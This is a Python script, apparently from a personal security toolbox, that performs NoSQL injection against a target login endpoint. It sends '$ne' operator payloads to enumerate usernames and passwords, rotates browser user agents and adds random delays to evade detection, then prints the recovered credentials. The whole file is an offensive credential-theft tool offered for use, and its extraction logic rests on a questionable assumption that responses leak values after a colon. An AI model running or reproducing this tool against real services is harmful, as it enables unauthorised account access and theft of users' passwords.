#!/usr/bin/env python3
# ┌────────────────────────────────────────────────────────┐
# │ Version        : 2026.07.24-00                         │
# │ Author         : Mark Hamilton │ Co-Pilot AI assisted  │
# │ Script Purpose : Extract creds from NoSQL endpoints    │
# │ Package        : toolbox                               │
# └────────────────────────────────────────────────────────┘
#
# Usage:
#   nosql-creds.py --url <target> [--username <user>] [--dry-run] [--verbose] [--log] [--hashmap]
#
# Description:
#   Performs blind NoSQL injection to enumerate usernames and passwords from a
#   vulnerable endpoint. Uses exclusion-based payloads, randomised user-agents,
#   and timing jitter to simulate stealthy probing behaviour. Supports extracting
#   credentials for a specific user or full enumeration.
#
# Output Files:
#   /var/log/nosql-creds.py.log           (when --log is used)
#   .hashmap/nosql-creds.py.hash          (when --hashmap is used)
#   .hashmap/nosql-creds.py.timestamp     (when --hashmap is used)
#
# End Help

import argparse
import os
import sys
import ssl
import hashlib
import datetime
import requests
import random
import time

# ─── Metadata ─────────────────────────────────────────────
TOOL_NAME = "nosql-creds.py"
VERSION = "2026.07.24-00"

LOGFILE = f"/var/log/{TOOL_NAME}.log"
HASHDIR = ".hashmap"
HASHFILE = f"{HASHDIR}/{TOOL_NAME}.hash"
TIMESTAMP = f"{HASHDIR}/{TOOL_NAME}.timestamp"

# ─── Randomised User Agents ───────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2) AppleWebKit/537.36",
]

# ─── Helpers ──────────────────────────────────────────────
def log(msg, verbose):
    if verbose:
        print(f"[LOG] {msg}")

def write_log(dry_run, verbose, logging, hashmap):
    if logging and not dry_run:
        os.makedirs(os.path.dirname(LOGFILE), exist_ok=True)
        with open(LOGFILE, "a") as lf:
            lf.write("=== " + TOOL_NAME + " ===\n")
            lf.write(str(datetime.datetime.now()) + "\n")
            lf.write(f"Version: {VERSION}\n")
            lf.write(f"Flags: DRY_RUN={dry_run} VERBOSE={verbose} LOGGING={logging} HASHMAP={hashmap}\n")
            lf.write("====================\n")

def write_hashmap():
    os.makedirs(HASHDIR, exist_ok=True)
    with open(TIMESTAMP, "w") as tf:
        tf.write(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    with open(HASHFILE, "w") as hf:
        with open(sys.argv[0], "rb") as sf:
            hf.write(hashlib.sha256(sf.read()).hexdigest())

# ─── Core Extraction Logic ────────────────────────────────
def extract_credentials(target_url, verbose):
    credentials = {}

    while True:
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        payload = {
            "username": {"$ne": list(credentials.keys())},
            "password": "random"
        }

        log(f"Sending NoSQL username enumeration payload: {payload}", verbose)
        response = requests.post(target_url, json=payload, headers=headers)

        time.sleep(random.uniform(1.5, 5))

        if "Invalid password" in response.text:
            new_user = extract_value(response.text)
            if new_user and new_user not in credentials:
                print(f"[+] Found username: {new_user}")
                credentials[new_user] = retrieve_password(target_url, new_user, verbose)
            else:
                break
        else:
            break

    print("\nDiscovered Credentials:")
    for user, password in credentials.items():
        print(f"- {user}: {password}")

def retrieve_password(target_url, username, verbose):
    discovered_passwords = []

    while True:
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        payload = {
            "username": username,
            "password": {"$ne": discovered_passwords}
        }

        log(f"Sending NoSQL password enumeration payload for {username}: {payload}", verbose)
        response = requests.post(target_url, json=payload, headers=headers)

        time.sleep(random.uniform(1.5, 5))

        if "Invalid password" in response.text:
            new_password = extract_value(response.text)
            if new_password and new_password not in discovered_passwords:
                print(f"[+] Found password for {username}: {new_password}")
                discovered_passwords.append(new_password)
            else:
                break
        else:
            break

    return discovered_passwords[-1] if discovered_passwords else "Not Found"

def extract_value(response_text):
    return response_text.split(":")[1].strip()

# ─── Main Logic ───────────────────────────────────────────
def main_logic(args):
    log(f"Starting {TOOL_NAME} version {VERSION}", args.verbose)

    if args.dry_run:
        print("[DRY-RUN] NoSQL credential extraction simulated.")
        return

    if args.username:
        retrieve_password(args.url, args.username, args.verbose)
    else:
        extract_credentials(args.url, args.verbose)

# ─── Main Entry Point ─────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description=f"{TOOL_NAME} — toolbox Python tool")
    parser.add_argument("--url", required=True, help="Target URL of the vulnerable endpoint")
    parser.add_argument("--username", help="Optional: extract password for a specific user")
    parser.add_argument("--dry-run", action="store_true", help="Simulate actions without executing")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
    parser.add_argument("--log", action="store_true", help="Write execution details to log file")
    parser.add_argument("--hashmap", action="store_true", help="Generate traceability files")
    args = parser.parse_args()

    main_logic(args)

    if args.log:
        write_log(args.dry_run, args.verbose, args.log, args.hashmap)

    if args.hashmap:
        write_hashmap()

if __name__ == "__main__":
    main()
                       
